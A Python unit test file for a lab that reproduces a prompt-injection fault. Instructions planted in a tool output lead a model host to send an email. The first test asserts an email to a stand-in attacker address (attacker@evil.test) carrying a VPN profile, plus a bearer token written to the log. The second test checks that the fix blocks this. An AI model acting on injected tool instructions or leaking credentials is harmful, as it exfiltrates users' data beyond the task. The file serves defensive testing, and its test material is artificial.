"""Failure lab: injected instructions in a tool output make the model request send_email outside the task.

Before the fix (fault on):  L600_08_INJECT=naive-host python -m unittest test_failure_lab   -> 1 failure
After the fix (default):    python -m unittest test_failure_lab                             -> OK
"""
import unittest

import _lab
import scenarios as sc


class TestFailureLab(unittest.TestCase):
    def test_symptom_naive_host_sends_the_email(self):
        env, _ = sc.s2_injection(_lab.url(), _lab.registry(), {"naive-host"})
        self.assertEqual(env.world.effects, [("send_email", {"to": "attacker@evil.test", "subject": "notes",
                                                              "body": "vpn profile corp-wg"})])
        self.assertIn('"token": "', env.host.log[0])  # and it logs the bearer token with raw args

    def test_injected_side_effect_never_executes(self):
        env, _ = sc.s2_injection(_lab.url(), _lab.registry(), _lab.FAULTS)
        self.assertEqual(env.world.effects, [], f"faults={sorted(_lab.FAULTS)}")


if __name__ == "__main__":
    unittest.main()
